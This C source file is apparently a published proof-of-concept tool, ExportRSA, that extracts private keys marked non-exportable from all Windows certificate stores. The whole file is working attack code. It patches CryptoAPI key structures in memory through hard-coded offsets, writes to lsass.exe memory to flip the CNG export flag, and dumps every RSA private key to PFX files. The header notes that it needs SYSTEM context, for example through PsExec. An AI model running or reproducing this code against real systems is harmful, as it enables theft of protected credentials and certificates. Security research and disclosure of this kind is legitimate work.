/*
This is free and unencumbered software released into the public domain.
Anyone is free to copy, modify, publish, use, compile, sell, or
distribute this software, either in source code form or as a compiled
binary, for any purpose, commercial or non-commercial, and by any
means.
In jurisdictions that recognize copyright laws, the author or authors
of this software dedicate any and all copyright interest in the
software to the public domain. We make this dedication for the benefit
of the public at large and to the detriment of our heirs and
successors. We intend this dedication to be an overt act of
relinquishment in perpetuity of all present and future rights to this
software under copyright law.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
OTHER DEALINGS IN THE SOFTWARE.
*/
/*
code inspired from the following paper:
https://www.nccgroup.trust/globalassets/our-research/uk/whitepapers/exporting_non-exportable_rsa_keys.pdf

ExportRSA v1.0
by Jason Geffner (jason.geffner@ngssecure.com)
This program enumerates all certificates in all system stores in all system
store locations and creates PFX files in the current directory for each
certificate found that has a local associated RSA private key. Each PFX file
created includes the ceritificate's private key, even if the private key was
marked as non-exportable.
For access to CNG RSA private keys, this program must be run with write-access
to the process that hosts the KeyIso service (the lsass.exe process). Either
modify the ACL on the target process, or run this program in the context of
SYSTEM with a tool such as PsExec.
This code performs little-to-no error-checking, does not free allocated memory,
and does not release handles. It is provided as proof-of-concept code with a
focus on simplicity and readability. As such, the code below in its current
form should not be used in a production environment.
This code was successfully tested on:
Windows 2000 (32-bit)
Windows XP (32-bit)
Windows Server 2003 (32-bit)
Windows Vista (32-bit)
Windows Mobile 6 (32-bit)
Windows Server 2008 (32-bit)
Windows 7 (32-bit, 64-bit)
Release History:
March 18, 2011 - v1.0 - First public release
*/
#include "stdafx.h"

#include <Windows.h>
#include <WinCrypt.h>
#include <stdio.h>

#pragma comment(lib, "crypt32.lib")
#ifndef WINCE
#pragma comment(lib, "ncrypt.lib")
#endif

#ifndef CERT_NCRYPT_KEY_SPEC
#define CERT_NCRYPT_KEY_SPEC 0xFFFFFFFF
#endif

unsigned long g_ulFileNumber;
BOOL g_fWow64Process;

BOOL WINAPI
CertEnumSystemStoreCallback(
        const void* pvSystemStore,
        DWORD dwFlags,
        PCERT_SYSTEM_STORE_INFO pStoreInfo,
        void* pvReserved,
        void* pvArg)
{
    // Open a given certificate store
    HCERTSTORE hCertStore = CertOpenStore(
                CERT_STORE_PROV_SYSTEM,
                0,
                NULL,
                dwFlags | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG,
                pvSystemStore);
    if (NULL == hCertStore)
    {
        fprintf(stderr, "Cannot open cert store. Skip it: %X\n", GetLastError());
        return TRUE;
    }

    // Enumerate all certificates in the given store
    LPTSTR dwCertName = NULL;
    DWORD cbSize;

    for (PCCERT_CONTEXT pCertContext = CertEnumCertificatesInStore(hCertStore, NULL);
         NULL != pCertContext;
         pCertContext = CertEnumCertificatesInStore(hCertStore, pCertContext))
    {
		if (dwCertName)
		{
			free(dwCertName);
		}

        if(!(cbSize = CertGetNameString(   
            pCertContext,   
            CERT_NAME_SIMPLE_DISPLAY_TYPE,   
            0,
            NULL,   
            NULL,   
            0)))
        {
           fprintf(stderr, "CertGetName 1 failed.");
        }
        dwCertName = (LPTSTR)malloc(cbSize * sizeof(TCHAR));

        if(CertGetNameString(
            pCertContext,
            CERT_NAME_SIMPLE_DISPLAY_TYPE,
            0,
            NULL,
            dwCertName,
            cbSize))

        {
            //fprintf(stderr, "\nSubject -> %S.\n", dwCertName);
        }
        else
        {
            fprintf(stderr, "CertGetName failed.");
        }

        // Ensure that the certificate's public key is RSA
        if (strncmp(pCertContext->pCertInfo->SubjectPublicKeyInfo.Algorithm.pszObjId,
                    szOID_RSA,
                    strlen(szOID_RSA)))
        {
            fprintf(stderr, "Skip cert with NO rsa public key for %S\n", dwCertName);
            continue;
        }
        // END OF ADDED

        // Ensure that the certificate's private key is available
        DWORD dwKeySpec;
        DWORD dwKeySpecSize = sizeof(dwKeySpec);
        if (!CertGetCertificateContextProperty(
                    pCertContext,
                    CERT_KEY_SPEC_PROP_ID,
                    &dwKeySpec,
                    &dwKeySpecSize))
        {
            //fprintf(stderr, "Skip cert with NO private key for %S: %x\n", dwCertName, GetLastError());
            continue;
        }

        // Retrieve a handle to the certificate's private key's CSP key
        // container
        HCRYPTPROV hProv;
        HCRYPTPROV hProvTemp;
#ifdef WINCE
        HCRYPTPROV hCryptProvOrNCryptKey;
#else
        HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hCryptProvOrNCryptKey;
        NCRYPT_KEY_HANDLE hNKey;
#endif
        BOOL fCallerFreeProvOrNCryptKey;
        if (!CryptAcquireCertificatePrivateKey(
                    pCertContext,
                #ifdef WINCE
                    0,
                #else
                    CRYPT_ACQUIRE_ALLOW_NCRYPT_KEY_FLAG,
                #endif
                    NULL,
                    &hCryptProvOrNCryptKey,
                    &dwKeySpec,
                    &fCallerFreeProvOrNCryptKey))
        {
            fprintf(stderr, "Skip cert with NO private key handler for %S: %x\n", dwCertName, GetLastError());
            continue;
        }

        // do the job
        hProv = hCryptProvOrNCryptKey;
#ifndef WINCE
        hNKey = hCryptProvOrNCryptKey;
#endif
        HCRYPTKEY hKey;
        BYTE* pbData = NULL;
        DWORD cbData = 0;
        if (CERT_NCRYPT_KEY_SPEC != dwKeySpec)
        {
            // This code path is for CryptoAPI
            fprintf(stdout, "Key for %S use CryptoAPI\n", dwCertName);

            // Retrieve a handle to the certificate's private key
            if (!CryptGetUserKey(
                        hProv,
                        dwKeySpec,
                        &hKey))
            {
                fprintf(stderr, "Cannot retrieve handle to the private key for %S\n", dwCertName);
                continue;
            }

            // Mark the certificate's private key as exportable and archivable
            *(ULONG_PTR*)(*(ULONG_PTR*)(*(ULONG_PTR*)
                #if defined(_M_X64)
                    (hKey + 0x58) ^ 0xE35A172CD96214A0) + 0x0C)
                #elif (defined(_M_IX86) || defined(_ARM_))
                    (hKey + 0x2C) ^ 0xE35A172C) + 0x08)
                #else
                    #error Platform not supported
                #endif
                    |= CRYPT_EXPORTABLE | CRYPT_ARCHIVABLE;

            // Export the private key
            // first to retieve the lenght, then to retrieve data
            if (!CryptExportKey(
                      hKey,
                      NULL,
                      PRIVATEKEYBLOB,
                      0,
                      NULL,
                      &cbData))
            {
                fprintf(stderr, "Cannot get private key lenght for for %S: %x\n", dwCertName, GetLastError() );
                continue;
            }
            pbData = (BYTE*)malloc(cbData);

            if (!CryptExportKey(
                      hKey,
                      NULL,
                      PRIVATEKEYBLOB,
                      0,
                      pbData,
                      &cbData))
            {
                fprintf(stderr, "Cannot export private key for for %s: %S\n", dwCertName, GetLastError() );
                continue;
            }

            fprintf(stdout, "SUCCESS get private key for %S\n", dwCertName );

            // Establish a temporary key container
            if (!CryptAcquireContext(
                        &hProvTemp,
                        NULL,
                        NULL,
                        PROV_RSA_FULL,
                        CRYPT_VERIFYCONTEXT | CRYPT_NEWKEYSET))
            {
                fprintf(stderr, "Cannot create temporary key container to store key for %S: %x\n", dwCertName, GetLastError() );
                continue;
            }
            // Import the private key into the temporary key container
            HCRYPTKEY hKeyNew;
            if (!CryptImportKey(
                        hProvTemp,
                        pbData,
                        cbData,
                        0,
                        CRYPT_EXPORTABLE,
                        &hKeyNew))
            {
                fprintf(stderr, "Cannot import key in temporary key container to store key for %S: %x\n", dwCertName, GetLastError() );
                continue;
            }
        }
#ifndef WINCE
        else
        {
            fprintf(stdout, "Key for %S is a CNG key\n", dwCertName);

            // This code path is for CNG
            // Retrieve a handle to the Service Control Manager
            SC_HANDLE hSCManager = OpenSCManager(
                        NULL,
                        NULL,
                        SC_MANAGER_CONNECT);
            // Retrieve a handle to the KeyIso service
            SC_HANDLE hService = OpenService(
                        hSCManager,
                        L"KeyIso",
                        SERVICE_QUERY_STATUS);
            // Retrieve the status of the KeyIso process, including its Process
            // ID
            SERVICE_STATUS_PROCESS ssp;
            DWORD dwBytesNeeded;
            QueryServiceStatusEx(
                        hService,
                        SC_STATUS_PROCESS_INFO,
                        (BYTE*)&ssp,
                        sizeof(SERVICE_STATUS_PROCESS),
                        &dwBytesNeeded);
            // Open a read-write handle to the process hosting the KeyIso
            // service
            HANDLE hProcess = OpenProcess(
                        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                        FALSE,
                        ssp.dwProcessId);
            // Prepare the structure offsets for accessing the appropriate
            // field
            DWORD dwOffsetNKey;
            DWORD dwOffsetSrvKeyInLsass;
            DWORD dwOffsetKspKeyInLsass;
		#if defined(_M_X64)
            dwOffsetNKey = 0x10;
            dwOffsetSrvKeyInLsass = 0x28;
            dwOffsetKspKeyInLsass = 0x28;
		#elif defined(_M_IX86)
            dwOffsetNKey = 0x08;
            if (!g_fWow64Process)
            {
                dwOffsetSrvKeyInLsass = 0x18;
                dwOffsetKspKeyInLsass = 0x20;
            }
            else
            {
                dwOffsetSrvKeyInLsass = 0x28;
                dwOffsetKspKeyInLsass = 0x28;
            }
		#else
            // Platform not supported
            continue;
		#endif
            // Mark the certificate's private key as exportable
            DWORD pKspKeyInLsass;
            SIZE_T sizeBytes;
            ReadProcessMemory(
                        hProcess,
                        (void*)(*(SIZE_T*)*(DWORD*)(hNKey + dwOffsetNKey) +
                                dwOffsetSrvKeyInLsass),
                        &pKspKeyInLsass,
                        sizeof(DWORD),
                        &sizeBytes);
            unsigned char ucExportable;
            ReadProcessMemory(
                        hProcess,
                        (void*)(pKspKeyInLsass + dwOffsetKspKeyInLsass),
                        &ucExportable,
                        sizeof(unsigned char),
                        &sizeBytes);
            ucExportable |= NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG;
            WriteProcessMemory(
                        hProcess,
                        (void*)(pKspKeyInLsass + dwOffsetKspKeyInLsass),
                        &ucExportable,
                        sizeof(unsigned char),
                        &sizeBytes);
            // Export the private key
            SECURITY_STATUS ss = NCryptExportKey(
                        hNKey,
                        NULL,
                        LEGACY_RSAPRIVATE_BLOB,
                        NULL,
                        NULL,
                        0,
                        &cbData,
                        0);
            pbData = (BYTE*)malloc(cbData);
            ss = NCryptExportKey(
                        hNKey,
                        NULL,
                        LEGACY_RSAPRIVATE_BLOB,
                        NULL,
                        pbData,
                        cbData,
                        &cbData,
                        0);
            // Establish a temporary CNG key store provider
            NCRYPT_PROV_HANDLE hProvider;
            NCryptOpenStorageProvider(
                        &hProvider,
                        MS_KEY_STORAGE_PROVIDER,
                        0);
            // Import the private key into the temporary storage provider
            NCRYPT_KEY_HANDLE hKeyNew;
            NCryptImportKey(
                        hProvider,
                        NULL,
                        LEGACY_RSAPRIVATE_BLOB,
                        NULL,
                        &hKeyNew,
                        pbData,
                        cbData,
                        0);
        }
#endif

        // Create a temporary certificate store in memory
        HCERTSTORE hMemoryStore = CertOpenStore(
                    CERT_STORE_PROV_MEMORY,
                    PKCS_7_ASN_ENCODING | X509_ASN_ENCODING,
                    NULL,
                    0,
                    NULL);

        // Add a link to the certificate to our tempoary certificate store
        PCCERT_CONTEXT pCertContextNew = NULL;
        CertAddCertificateLinkToStore(
                    hMemoryStore,
                    pCertContext,
                    CERT_STORE_ADD_NEW,
                    &pCertContextNew);

        // Set the key container for the linked certificate to be our temporary
        // key container
        CertSetCertificateContextProperty(
                    pCertContext,
            #ifdef WINCE
                    CERT_KEY_PROV_HANDLE_PROP_ID,
            #else
                    CERT_HCRYPTPROV_OR_NCRYPT_KEY_HANDLE_PROP_ID,
            #endif
                    0,
            #ifdef WINCE
                    (void*)hProvTemp);
            #else
                    (void*)((CERT_NCRYPT_KEY_SPEC == dwKeySpec) ?
                                hNKey : hProvTemp));
            #endif

        // Export the tempoary certificate store to a PFX data blob in memory
        CRYPT_DATA_BLOB cdb;
        cdb.cbData = 0;
        cdb.pbData = NULL;
        PFXExportCertStoreEx(
                    hMemoryStore,
                    &cdb,
                    NULL,
                    NULL,
                    EXPORT_PRIVATE_KEYS | REPORT_NO_PRIVATE_KEY
                    | REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY);
        cdb.pbData = (BYTE*)malloc(cdb.cbData);

        PFXExportCertStoreEx(
                    hMemoryStore,
                    &cdb,
                    NULL,
                    NULL,
                    EXPORT_PRIVATE_KEYS | REPORT_NO_PRIVATE_KEY
					| REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY);

        // Prepare the PFX's file name
        wchar_t wszFileName[MAX_PATH];
        swprintf(   wszFileName,
                    L"%d.pfx",
                    g_ulFileNumber++);

        // Write the PFX data blob to disk
        HANDLE hFile = CreateFile(
                    wszFileName,
                    GENERIC_WRITE,
                    0,
                    NULL,
                    CREATE_ALWAYS,
                    0,
                    NULL);
        DWORD dwBytesWritten;

        WriteFile(  hFile,
                    cdb.pbData,
                    cdb.cbData,
                    &dwBytesWritten,
                    NULL);
        CloseHandle(hFile);
    }
    return TRUE;
}

BOOL WINAPI
CertEnumSystemStoreLocationCallback(
        LPCWSTR pvszStoreLocations,
        DWORD dwFlags,
        void* pvReserved,
        void* pvArg)
{
    // Enumerate all system stores in a given system store location
    CertEnumSystemStore(
                dwFlags,
                NULL,
                NULL,
                CertEnumSystemStoreCallback);

    return TRUE;
}

int _tmain(int argc, _TCHAR* argv[])
{
    // Initialize g_ulFileNumber
    g_ulFileNumber = 1;
    // Determine if we're a 32-bit process running on a 64-bit OS
    g_fWow64Process = FALSE;
    BOOL (WINAPI* IsWow64Process)(HANDLE, PBOOL) =
            (BOOL (WINAPI*)(HANDLE, PBOOL))GetProcAddress(
                GetModuleHandle(L"kernel32.dll"), "IsWow64Process");
    if (NULL != IsWow64Process)
    {
        IsWow64Process( GetCurrentProcess(),
                        &g_fWow64Process);
    }
    // Scan all system store locations
	CertEnumSystemStoreLocation(
                0,
                NULL,
                CertEnumSystemStoreLocationCallback);

    return 0;
}